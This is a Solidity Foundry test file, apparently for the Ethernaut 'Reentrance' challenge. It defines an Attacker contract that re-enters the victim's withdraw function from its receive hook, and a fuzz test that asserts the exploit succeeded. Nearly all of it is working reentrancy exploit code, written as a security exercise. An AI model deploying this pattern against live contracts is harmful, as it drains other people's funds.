
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    Reentrance reentrance;
    Attacker public _attacker;

    function setUp() public {
        reentrance = new Reentrance();
        _attacker = new Attacker(address(reentrance));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1 && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // We need to deposit enough to cover multiple withdrawals to avoid 0.8.x underflow revert
        uint256 totalDeposit = attackVal * 2;

        // --- 3. Funding ---
        vm.deal(address(reentrance), totalDeposit); 
        vm.deal(address(this), totalDeposit);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: totalDeposit}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrance victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    
    uint256 public storedVal;
    bool private isReentering;

    constructor(address victimAddress) { 
        victim = Reentrance(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        isReentering = false;
        
        // Deposit 2x the amount we intend to withdraw in one call.
        // This allows us to withdraw 'val' twice (once in main call, once in re-entrant call)
        // without triggering Solidity 0.8.x underflow protection on the final balance update.
        victim.donate{value: msg.value}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;

        victim.withdraw(val);

        // If attackCallCount is 2, it means we successfully re-entered
        if (attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2 && !isReentering) {            
            isReentering = true;
            
            // Re-enter the contract
            // Because state hasn't updated yet, balances[this] is still 2 * storedVal
            victim.withdraw(storedVal);
            
            isReentering = false;
            attackCallCount++;
        }
    }
}
